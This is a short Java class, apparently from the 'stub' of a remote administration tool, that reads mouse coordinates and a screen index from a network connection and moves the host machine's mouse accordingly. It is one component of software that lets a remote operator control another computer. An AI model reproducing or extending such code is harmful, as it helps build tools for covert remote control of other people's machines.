package com.redpois0n.stub.stub.packets.incoming;

import com.redpois0n.stub.Connection;
import com.redpois0n.stub.Main;

public class Packet91MouseMove extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		int x = Connection.readInt();
		int y = Connection.readInt();
		int i = Connection.readInt();
		if (i == -1) {
			Main.robot.mouseMove(x, y);
		} else {
			Main.robots[i].mouseMove(x, y);
		}

	}

}
